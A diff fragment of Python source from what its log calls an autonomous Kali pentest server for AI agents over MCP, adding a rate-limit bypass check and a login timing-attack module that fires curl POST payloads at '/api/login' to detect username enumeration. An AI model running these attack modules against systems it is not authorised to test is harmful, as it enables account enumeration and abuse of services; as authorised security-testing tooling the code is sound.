+                    for _ in range(10)]
+                resps = await asyncio.gather(*tasks, return_exceptions=True)
+                success_count = sum(1 for r in resps
+                                     if not isinstance(r, Exception) and r.get("stdout", "").startswith("2"))
+                if success_count > 1:
+                    lb["bypasses_found"].append({
+                        "endpoint": ep, "successes": success_count,
+                        "detail": f"{success_count}/10 requests succeeded (expected max 1)",
+                    })
+                lb["tests"].append({"endpoint": ep, "successes": success_count})
+            results["modules"]["limit_bypass"] = lb
+
+        # --- TIMING ATTACK ---
+        if "timing_attack" in mod_list:
+            ta = {"tests": [], "timing_leak": False}
+            url = f"{base_url}{endpoint or '/api/login'}"
+            # Compare response times for valid vs invalid inputs
+            timing_tests = [
+                ("valid_prefix", '{"username":"admin","password":"a"}'),
+                ("invalid_user", '{"username":"nonexistent_user_xyz","password":"a"}'),
+                ("long_password", '{"username":"admin","password":"' + "A" * 1000 + '"}'),
+                ("empty_input", '{"username":"","password":""}'),
+            ]
+            for name, payload in timing_tests:
+                times = []
+                for _ in range(5):
+                    r = await run_command(
+                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{time_total}",
+                         "-X", "POST", "-d", payload,
+                         "-H", "Content-Type: application/json", url], timeout=10)
+                    try:
+                        times.append(float(r.get("stdout", "0")))
+                    except ValueError:
+                        pass
+                avg_time = sum(times) / len(times) if times else 0
+                ta["tests"].append({"name": name, "avg_time_ms": round(avg_time * 1000, 2),
+                                     "samples": len(times)})
+
+            # Detect timing leak: significant difference between valid/invalid
+            if len(ta["tests"]) >= 2:
+                times_by_name = {t["name"]: t["avg_time_ms"] for t in ta["tests"]}
+                valid_time = times_by_name.get("valid_prefix", 0)
+                invalid_time = times_by_name.get("invalid_user", 0)
+                if valid_time > 0 and invalid_time > 0:
+                    diff = abs(valid_time - invalid_time)
+                    if diff > 50:  # >50ms difference suggests timing leak
+                        ta["timing_leak"] = True
+                        ta["timing_diff_ms"] = round(diff, 2)
+
+            results["modules"]["timing_attack"] = ta
+
+        results["correlation"] = vuln_correlator.correlate(target)
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
 # SERVER STARTUP
 # ============================================================================
 
 if __name__ == "__main__":
     logger.info("Starting Kali MCP Server v6 - Autonomous Pentest Engine")
-    logger.info("Architecture: 20 unified mega-modules")
+    logger.info("Architecture: 22 unified mega-modules")
     mcp.run(transport="stdio")
